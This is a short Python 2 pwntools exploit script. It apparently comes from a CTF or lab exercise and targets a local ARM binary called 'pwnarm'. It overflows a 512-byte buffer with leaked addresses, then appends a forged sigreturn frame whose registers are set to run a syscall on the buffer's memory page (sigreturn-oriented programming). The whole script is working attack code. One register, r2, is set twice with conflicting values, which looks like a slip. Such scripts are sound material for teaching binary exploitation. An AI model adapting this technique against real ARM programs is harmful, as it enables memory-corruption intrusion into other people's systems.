from pwn import *
import Frame
import time

context.arch = "arm"

# Do a hexdump of the contents
def myhexdump(a_string):
	from struct import unpack
	i = 0
	line = ""
	while True:
		data = a_string[i*4: (i*4)+4]
		if not data: break
		line += "%08x " % (unpack("<I", (data))[0])
		i += 1
		if i % 4 == 0:
			print line
			line = ""

p = process("./pwnarm")

# Receive the buffer and the function address
buf = int(p.recvline().strip().split(" = ")[1], 16)
function = int(p.recvline().strip().split(" = ")[1], 16)
log.info("Buffer=%x Function=%x" %(buf, function))

# Now we got sigreturn and SVC instruction address
SIGRETURN = function + 8
SVC = function + 12

buffer_page = buf & ~(4096 - 1)

sploit  = ""
sploit += "A" * 512
sploit += pack(buf)
sploit += pack(SIGRETURN)

frame = Frame.SigreturnFrame(arch="arm")
frame.set_regvalue("uc_flags", 0x5ac3c35a)
frame.set_regvalue("trap_no", 0x7)
frame.set_regvalue("r0", buffer_page)
frame.set_regvalue("r1", 0x1000)
frame.set_regvalue("r2", 0x7)
frame.set_regvalue("r2", 0x8)
frame.set_regvalue("r8", buffer_page)
frame.set_regvalue("r10", buffer_page)
frame.set_regvalue("fp", buffer_page)
frame.set_regvalue("ip", 0x7fffffff)
frame.set_regvalue("sp", buffer_page)
frame.set_regvalue("lr", buffer_page)
frame.set_regvalue("pc", SVC)

USR_MODE = 0x0
PSR_I_BIT = 0x00000080
PSR_A_BIT = 0x00000100
PSR_F_BIT = 0x00000040
MODE_MASK = 0x0000001f

cpsr = 0x40000001
cpsr &= ~(PSR_F_BIT | PSR_A_BIT)
mode = cpsr & MODE_MASK
assert (cpsr & PSR_I_BIT) == 0x0
print hex(mode)
assert mode == USR_MODE

frame.set_regvalue("cpsr", cpsr)
f = frame.get_frame()
myhexdump(f)
sploit += f

p.sendline(sploit)

raw_input()
